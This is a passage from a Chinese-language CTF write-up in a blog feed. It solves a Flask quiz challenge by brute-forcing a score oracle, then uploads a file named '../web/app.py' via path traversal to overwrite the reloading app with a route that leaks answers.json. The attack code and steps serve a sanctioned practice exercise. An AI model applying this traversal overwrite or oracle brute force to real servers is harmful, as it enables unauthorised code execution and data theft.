class="hljs-comment"># 找到全0的平方差</span><br>    <span class="hljs-built_in">print</span>(scores1)<br>    <span class="hljs-built_in">print</span>(scores2)<br>    <span class="hljs-built_in">print</span>(all_zero_score)<br>    flag = <span class="hljs-string">&quot;&quot;</span><br>    payload = [<span class="hljs-number">0</span>]*<span class="hljs-number">500</span><br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-number">500</span>):<br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">40</span>):<br>            payload[j] = i<br>            scores1 = send(<span class="hljs-built_in">str</span>(payload))<br>            score = find_new_score (scores1, scores2)<br>            <span class="hljs-keyword">if</span> score == all_zero_score - i*i:<br>                flag += <span class="hljs-built_in">chr</span>(i+<span class="hljs-number">65</span>)<br>                <span class="hljs-built_in">print</span>(flag)<br>                <span class="hljs-keyword">break</span><br></code></pre></td></tr></table></figure><p>但是flag提交上去显示答案错误。因为在 flask 代码中做了「归一化」的操作：</p><figure class="highlight stylus"><table><tr><td class="code"><pre><code class="hljs stylus"><span class="hljs-keyword">for</span> idx, <span class="hljs-selector-tag">i</span> <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(answers):<br>    <span class="hljs-keyword">if</span> <span class="hljs-selector-tag">i</span> &lt; <span class="hljs-number">0</span>:<br>        answers<span class="hljs-selector-attr">[idx]</span> = <span class="hljs-number">0</span><br></code></pre></td></tr></table></figure><p>重新审题。题目中有提示：助教部署的时候偷懒了，直接用了 <code>flask run</code>（当然了，助教也读过 Flask 的文档，所以 DEBUG 是关了的）。而且有的时候助教想改改代码，又懒得手动重启，所以还开了 <code>--reload</code>。启动的<strong>完整命令</strong>为 <code>flask run --reload --host 0</code>。网站代码运行在 <code>/tmp/web</code>。</p><p>在使用 Flask 时，<code>app.py</code> 通常是 Flask 应用的主文件。这道题的关键是服务器的后端使用了<code>flask run --reload --host 0</code>命令运行，并开启了<code>--reload</code>选项，那么如果有文件换掉了<code>app.py</code>，flask会马上应用新的脚本。所以在源代码中写一个读取并返回<code>answer.json</code>的route，然后上传替换掉原本的 <code>app.py</code> 即可。</p><figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/flag&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">flag</span>(): <br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;answers.json&#x27;</span>, <span class="hljs-string">&#x27;r&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>answers = json.load(f)<br><span class="hljs-keyword">return</span> answers<br></code></pre></td></tr></table></figure><p>上传文件的目录是 <code>/tmp/uploads</code> ，题干又特意提示了网站目录在 <code>/tmp/web</code>，想到路径穿越漏洞。上传文件的时候，给文件名前加上<code>../</code>就可以穿透目录，上传到任意的地方去。BurpSuite抓包，修改传输路径为<code>../web/app.py</code>。</p><p><img src="/../images/Pasted%20image%2020241111134142.png"></p><p>访问&#x2F;flag：<br><img src="/../images/Pasted%20image%2020241111134241.png"></p><p>对应的数字加 65 后使用 ASCII 编码转换：</p><figure class="highlight apache"><table><tr><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">flag</span> = <span class="hljs-string">&quot;&quot;</span><br><span class="hljs-attribute">a</span>=[<span class="hljs-number">37</span>,<span class="hljs-number">43</span>,<span class="hljs-number">32</span>,<span class="hljs-number">38</span>,<span class="hljs-number">58</span>,<span class="hljs-number">52</span>,<span class="hljs-number">45</span>,<span class="hljs-number">46</span>,-<span class="hljs-number">32</span>,-<span class="hljs-number">32</span>,-<span class="hljs-number">32</span>,-<span class="hljs-number">32</span>,<span class="hljs-number">30</span>,<span class="hljs-number">36</span>,<span class="hljs-number">50</span>,<span class="hljs-number">49</span>,<span class="hljs-number">36</span>,<span class="hljs-number">53</span>,<span class="hljs-number">36</span>,<span class="hljs-number">49</span>,<span class="hljs-number">30</span>,<span class="hljs-number">45</span>,<span class="hljs-number">46</span>,<span class="hljs-number">54</span>,<span class="hljs-number">30</span>,<span class="hljs-number">20</span>,<span class="hljs-number">30</span>,<span class="hljs-number">49</span>,<span class="hljs-number">52</span>,<span class="hljs-number">45</span>,<span class="hljs-number">30</span>,<span class="hljs-number">12</span>,<span class="hljs-number">24</span>,<span class="hljs-number">30</span>,<span class="hljs-number">34</span>,-<span class="hljs-number">17</span>,<span class="hljs-number">35</span>,<span class="hljs-number">36</span>,<span class="hljs-number">36</span>,-<span class="hljs-number">17</span>,-<span class="hljs-number">16</span>,-<span class="hljs-number">14</span>,<span class="hljs-number">32</span>,-<span class="hljs-number">10</span>,<span class="hljs-number">33</span>,-<span class="hljs-number">8</span>,<span class="hljs-number">36</span>,-<span class="hljs-number">17</span>,<span class="hljs-number">60</span>,<span class="hljs-number">56</span>,<span class="hljs-number">38</span>,<span class="hljs-number">37</span>,<span class="hljs-number">79</span>,<span class="hljs-number">59</span>,<span class="hljs-number">9</span>,<span class="hljs-number">33</span>,<span class="hljs-number">88</span>,<span class="hljs-number">72</span>,<span class="hljs-number">58</span>,<span class="hljs-number">80</span>,<span class="hljs-number">17</span>,<span class="hljs-number">3</span>,<span class="hljs-number">81</span>,<span class="hljs-number">17</span>,<span class="hljs-number">87</span>,<span class="hljs-number">89</span>,<span class="hljs-number">34</span>,<span class="hljs-number">74</span>,<span class="hljs-number">92</span>,<span class="hljs-number">25</span>,<span class="hljs-number">76</span>,<span class="hljs-number">38</span>,<span class="hljs-number">98</span>,<span class="hljs-number">15</span>,<span class="hljs-number">18</span>,<span class="hljs-number">45</span>,<span class="hljs-number">41</span>,<span class="hljs-number">9</span>,<span class="hljs-number">20</span>,<span class="hljs-number">4</span>,<span class="hljs-number">17</span>,<span class="hljs-number">94</span>,<span class="hljs-number">9</span>,<span class="hljs-number">99</span>,<span class="hljs-number">87</span>,<span class="hljs-number">65</span>,<span class="hljs-number">35</span>,<span class="hljs-number">73</span>,<span class="hljs-number">63</span>,<span class="hljs-number">50</span>,<span class="hljs-number">57</span>,<span class="hljs-number">49</span>,<span class="hljs-number">95</span>,<span class="hljs-number">27</span>,<span class="hljs-number">35</span>,<span class="hljs-number">9</span>,<span class="hljs-number">27</span>,<span class="hljs-number">13</span>,<span class="hljs-number">62</span>,<span class="hljs-number">32</span>,<span class="hljs-number">84</span>,<span class="hljs-number">34</span>,<span class="hljs-number">76</span>,<span class="hljs-number">43</span>,<span class="hljs-number">80</span>,<span class="hljs-number">3</span>,<span class="hljs-number">78</span>,<span class="hljs-number">33</span>,<span class="hljs-number">1</span>,<span class="hljs-number">24</span>,<span class="hljs-number">83</span>,<span class="hljs-number">58</span>,<span class="hljs-number">98</span>,<span class="hljs-number">62</span>,<span class="hljs-number">6</span>,<span class="hljs-number">88</span>,<span class="hljs-number">76</span>,<span class="hljs-number">32</span>,<span class="hljs-number">9</span>,<span class="hljs-number">5</span>,<span class="hljs-number">54</span>,<span class="hljs-number">35</span>,<span class="hljs-number">69</span>,<span class="hljs-number">62</span>,<span class="hljs-number">74</span>,<span class="hljs-number">71</span>,<span class="hljs-number">20</span>,<span class="hljs-number">71</span>,<span class="hljs-number">67</span>,<span class="hljs-number">53</span>,<span class="hljs-number">30</span>,<span class="hljs-number">49</span>,<span class="hljs-number">99</span>,<span class="hljs-number">94</span>,<span class="hljs-number">69</span>,<span class="hljs-number">7</span>,<span class="hljs-number">47</span>,<span class="hljs-number">97</span>,<span class="hljs-number">94</span>,<span class="hljs-number">96</span>,<span class="hljs-number">67</span>,<span class="hljs-number">43</span>,<span class="hljs-number">40</span>,<span class="hljs-number">66</span>,<span class="hljs-number">5</span>,<span class="hljs-number">10</span>,<span class="hljs-number">88</span>,<span class="hljs-number">67</span>,<span class="hljs-number">10</span>,<span class="hljs-number">73</span>,<span class="hljs-number">20</span>,<span class="hljs-number">91</span>,<span class="hljs-number">10</span>,<span class="hljs-number">90</span>,<span class="hljs-number">99</span>,<span class="hljs-number">87</span>,<span class="hljs-number">65</span>,<span class="hljs-number">32</span>,<span class="hljs-number">81</span>,<span class="hljs-number">3</span>,<span class="hljs-number">80</span>,<span class="hljs-number">41</span>,<span class="hljs-number">67</span>,<span class="hljs-number">40</span>,<span class="hljs-number">19</span>,<span class="hljs-number">19</span>,<span class="hljs-number">14</span>,<span class="hljs-number">97</span>,<span class="hljs-number">97</span>,<span class="hljs-number">19</span>,<span class="hljs-number">4</span>,<span class="hljs-number">1</span>,<span class="hljs-number">76</span>,<span class="hljs-number">24</span>,<span class="hljs-number">57</span>,<span class="hljs-number">47</span>,<span class="hljs-number">77</span>,<span class="hljs-number">28</span>,<span class="hljs-number">28</span>,<span class="hljs-number">79</span>,<span class="hljs-number">1</span>,<span class="hljs-number">48</span>,<span class="hljs-number">55</span>,<span class="hljs-number">0</span>,<span class="hljs-number">20</span>,<span class="hljs-number">72</span>,<span class="hljs-number">49</span>,<span class="hljs-number">84</span>,<span class="hljs-number">4</span>,<span class="hljs-number">83</span>,<span class="hljs-number">4</span>,<span class="hljs-number">70</span>,<span class="hljs-number">16</span>,<span class="hljs-number">55</span>,<span class="hljs-number">37</span>,<span class="hljs-number">77</span>,<span class="hljs-number">13</span>,<span class="hljs-number">4</span>,<span class="hljs-number">43</span>,<span class="hljs-number">20</span>,<span class="hljs-number">46</span>,<span class="hljs-number">81</span>,<span class="hljs-number">12</span>,<span class="hljs-number">81</span>,<span class="hljs-number">59</span>,<span class="hljs-number">14</span>,<span class="hljs-number">23</span>,<span class="hljs-number">32</span>,<span class="hljs-number">77</span>,<span class="hljs-number">76</span>,<span class="hljs-number">81</span>,<span class="hljs-number">88</span>,<span class="hljs-number">44</span>,<span class="hljs-number">44</span>,<span class="hljs-number">11</span>,<span class="hljs-number">76</span>,<span class="hljs-number">92</span>,<span class="hljs-number">4</span>,<span class="hljs-number">21</span>,<span class="hljs-number">21</span>,<span class="hljs-number">92</span>,<span class="hljs-number">31</span>,<span class="hljs-number">89</span>,<span class="hljs-number">100</span>,<span class="hljs-number">78</span>,<span class="hljs-number">0</span>,<span class="hljs-number">2</span>,<span class="hljs-number">22</span>,<span class="hljs-number">84</span>,<span class="hljs-number">60</span>,<span class="hljs-number">28</span>,<span class="hljs-number">22</span>,<span class="hljs-number">66</span>,<span class="hljs-number">32</span>,<span class="hljs-number">5</span>,<span class="hljs-number">5</span>,<span class="hljs-number">87</span>,<span class="hljs-number">16</span>,<span class="hljs-number">14</span>,<span class="hljs-number">6</span>,<span class="hljs-number">69</span>,<span class="hljs-number">29</span>,<span class="hljs-number">77</span>,<span class="hljs-number">58</span>,<span class="hljs-number">77</span>,<span class="hljs-number">45</span>,<span class="hljs-number">37</span>,<span class="hljs-number">65</span>,<span class="hljs-number">36</span>,<span class="hljs-number">95</span>,<span class="hljs-number">71</span>,<span class="hljs-number">68</span>,<span class="hljs-number">57</span>,<span class="hljs-number">44</span>,<span class="hljs-number">56</span>,<span class="hljs-number">65</span>,<span class="hljs-number">69</span>,<span class="hljs-number">73</span>,<span class="hljs-number">83</span>,<span class="hljs-number">55</span>,<span class="hljs-number">8</span>,<span class="hljs-number">93</span>,<span class="hljs-number">18</span>,<span class="hljs-number">38</span>,<span class="hljs-number">98</span>,<span class="hljs-number">5</span>,<span class="hljs-number">24</span>,<span class="hljs-number">33</span>,<span class="hljs-number">52</span>,<span class="hljs-number">11</span>,<span class="hljs-number">2</span>,<span class="hljs-number">6</span>,<span class="hljs-number">66</span>,<span class="hljs-number">58</span>,<span class="hljs-number">61</span>,<span class="hljs-number">83</span>,<span class="hljs-number">78</span>,<span class="hljs-number">36</span>,<span class="hljs-number">35</span>,<span class="hljs-number">36</span>,<span class="hljs-number">41</span>,<span class="hljs-number">48</span>,<span class="hljs-number">71</span>,<span class="hljs-number">56</span>,<span class="hljs-number">83</span>,<span class="hljs-number">40</span>,<span class="hljs-number">90</span>,<span class="hljs-number">47</span>,<span class="hljs-number">67</span>,<span class="hljs-number">75</span>,<span class="hljs-number">13</span>,<span class="hljs-number">46</span>,<span class="hljs-number">13</span>,<span class="hljs-number">39</span>,<span class="hljs-number">60</span>,<span class="hljs-number">92</span>,<span class="hljs-number">58</span>,<span class="hljs-number">91</span>,<span class="hljs-number">42</span>,<span class="hljs-number">66</span>,<span class="hljs-number">54</span>,<span class="hljs-number">76</span>,<span class="hljs-number">100</span>,<span class="hljs-number">24</span>,<span class="hljs-number">66</span>,<span class="hljs-number">48</span>,<span class="hljs-number">35</span>,<span class="hljs-number">31</span>,<span class="hljs-number">5</span>,<span class="hljs-number">56</span>,<span class="hljs-number">80</span>,<span class="hljs-number">58</span>,<span class="hljs-number">91</span>,<span class="hljs-number">21</span>,<span class="hljs-number">9</span>,<span class="hljs-number">25</span>,<span class="hljs-number">5</span>,<span class="hljs-number">25</span>,<span class="hljs-number">10</span>,<span class="hljs-number">55</span>,<span class="hljs-number">5</span>,<span class="hljs-number">47</span>,<span class="hljs-number">30</span>,<span class="hljs-number">77</span>,<span class="hljs-number">86</span>,<span class="hljs-number">91</span>,<span class="hljs-number">5</span>,<span class="hljs-number">51</span>,<span class="hljs-number">37</span>,<span class="hljs-number">54</span>,<span class="hljs-number">47</span>,<span class="hljs-number">91</span>,<span class="hljs-number">34</span>,<span class="hljs-number">11</span>,<span class="hljs-number">56</span>,<span class="hljs-number">34</span>,<span class="hljs-number">93</span>,<span class="hljs-number">94</span>,<span class="hljs-number">64</span>,<span class="hljs-number">14</span>,<span class="hljs-number">41</span>,<span class="hljs-number">46</span>,<span class="hljs-number">88</span>,<span class="hljs-number">53</span>,<span class="hljs-number">12</span>,<span class="hljs-number">69</span>,<span class="hljs-number">89</span>,<span class="hljs-number">31</span>,<span class="hljs-number">66</span>,<span class="hljs-number">6</span>,<span class="hljs-number">33</span>,<span class="hljs-number">2</span>,<span class="hljs-number">36</span>,<span class="hljs-number">32</span>,<span class="hljs-number">30</span>,<span class="hljs-number">82</span>,<span class="hljs-number">27</span>,<span class="hljs-number">35</span>,<span class="hljs-number">91</span>,<span class="hljs-number">31</span>,<span class="hljs-number">55</span>,<span class="hljs-number">92</span>,<span class="hljs-number">67</span>,<span class="hljs-number">25</span>,<span class="hljs-number">71</span>,<span class="hljs-number">68</span>,<span class="hljs-number">26</span>,<span class="hljs-number">31</span>,<span class="hljs-number">89</span>,<span class="hljs-number">27</span>,<span class="hljs-number">60</span>,<span class="hljs-number">72</span>,<span class="hljs-number">1</span>,<span class="hljs-number">82</span>,<span class="hljs-number">68</span>,<span class="hljs-number">32</span>,<span class="hljs-number">7</span>,<span class="hljs-number">65</span>,<span class="hljs-number">14</span>,<span class="hljs-number">19</span>,<span class="hljs-number">59</span>,<span class="hljs-number">34</span>,<span class="hljs-number">85</span>,<span class="hljs-number">99</span>,<span class="hljs-number">21</span>,<span class="hljs-number">82</span>,<span class="hljs-number">27</span>,<span class="hljs-number">86</span>,<span class="hljs-number">31</span>,<span class="hljs-number">19</span>,<span class="hljs-number">10</span>,<span class="hljs-number">21</span>,<span class="hljs-number">53</span>,<span class="hljs-number">77</span>,<span class="hljs-number">38</span>,<span class="hljs-number">43</span>,<span class="hljs-number">48</span>,<span class="hljs-number">55</span>,<span class="hljs-number">41</span>,<span class="hljs-number">50</span>,<span class="hljs-number">50</span>,<span class="hljs-number">67</span>,<span class="hljs-number">1</span>,<span class="hljs-number">40</span>,<span class="hljs-number">74</span>,<span class="hljs-number">16</span>,<span class="hljs-number">34</span>,<span class="hljs-number">25</span>,<span class="hljs-number">25</span>,<span class="hljs-number">34</span>,<span class="hljs-number">53</span>,<span class="hljs-number">1</span>,<span class="hljs-number">43</span>,<span class="hljs-number">61</span>,<span class="hljs-number">22</span>,<span class="hljs-number">81</span>,<span class="hljs-number">50</span>,<span class="hljs-number">28</span>,<span class="hljs-number">72</span>,<span class="hljs-number">5</span>,<span class="hljs-number">19</span>,<span class="hljs-number">80</span>,<span class="hljs-number">81</span>,<span class="hljs-number">69</span>,<span class="hljs-number">87</span>,<span class="hljs-number">25</span>,<span class="hljs-number">42</span>,<span class="hljs-number">97</span>,<span class="hljs-number">15</span>,<span class="hljs-number">52</span>,<span class="hljs-number">80</span>,<span class="hljs-number">93</span>,<span class="hljs-number">16</span>,<span class="hljs-number">34</span>,<span class="hljs-number">1</span>,<span class="hljs-number">37</span>,<span class="hljs-number">2</span>,<span class="hljs-number">62</span>,<span class="hljs-number">59</span>,<span class="hljs-number">13</span>,<span class="hljs-number">53</span>,<span class="hljs-number">93</span>,<span class="hljs-number">87</span>,<span class="hljs-number">78</span>,<span class="hljs-number">30</span>,<span class="hljs-number">50</span>,<span class="hljs-number">46</span>,<span class="hljs-number">79</span>,<span class="hljs-number">50</span>,<span class="hljs-number">40</span>,<span class="hljs-number">70</span>,<span class="hljs-number">29</span>,<span class="hljs-number">29</span>,<span class="hljs-number">1</span>,<span class="hljs-number">16</span>,<span class="hljs-number">47</span>,<span class="hljs-number">81</span>,<span class="hljs-number">29</span>,<span class="hljs-number">71</span>,<span class="hljs-number">55</span>,<span class="hljs-number">46</span>,<span class="hljs-number">83</span>,<span class="hljs-number">79</span>,<span class="hljs-number">99</span>,<span class="hljs-number">3</span>,<span class="hljs-number">32</span>,<span class="hljs-number">85</span>,<span class="hljs-number">35</span>,<span class="hljs-number">0</span>,<span class="hljs-number">40</span>,<span class="hljs-number">79</span>,<span class="hljs-number">77</span>,<span class="hljs-number">85</span>,<span class="hljs-number">77</span>,<span class="hljs-number">9</span>,<span class="hljs-number">96</span>,<span class="hljs-number">74</span>,<span class="hljs-number">7</span>,<span class="hljs-number">78</span>,<span class="hljs-number">28</span>,<span class="hljs-number">11</span>,<span class="hljs-number">83</span>,<span class="hljs-number">3</span>,<span class="hljs-number">24</span>,<span class="hljs-number">46</span>,<span class="hljs-number">94</span>,<span class="hljs-number">45</span>,<span class="hljs-number">11</span>,<span class="hljs-number">20</span>,<span class="hljs-number">95</span>,<span class="hljs-number">10</span>,<span class="hljs-number">75</span>,<span class="hljs-number">66</span>,<span class="hljs-number">52</span>,<span class="hljs-number">44</span>,<span class="hljs-number">69</span>,<span class="hljs-number">32</span>,<span class="hljs-number">55</span>,<span class="hljs-number">29</span>,<span class="hljs-number">88</span>]<br><br><span class="hljs-attribute">for</span> num in a:<br>    <span class="hljs-attribute">char</span> = chr(num + <span class="hljs-number">65</span>)<br>    <span class="hljs-attribute">flag</span> += char<br><span class="hljs-attribute">print</span>(flag)<br></code></pre></td></tr></table></figure><p><img src="/../images/Pasted%20image%2020241111141350.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;签到&quot;&gt;&lt;a href=&quot;#签到&quot; class=&quot;headerlink&quot; title=&quot;签到&quot;&gt;&lt;/a&gt;签到&lt;/h1&gt;&lt;p&gt;&lt;img src=&quot;/../images/Pasted%20image%2020241103121215.png&quot;&gt;&lt;br&gt;&lt;img src</summary>
      
    
    
    
    
    <category term="CTF刷题记录" scheme="http://example.com/tags/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/"/>
    
  </entry>
  
</feed>
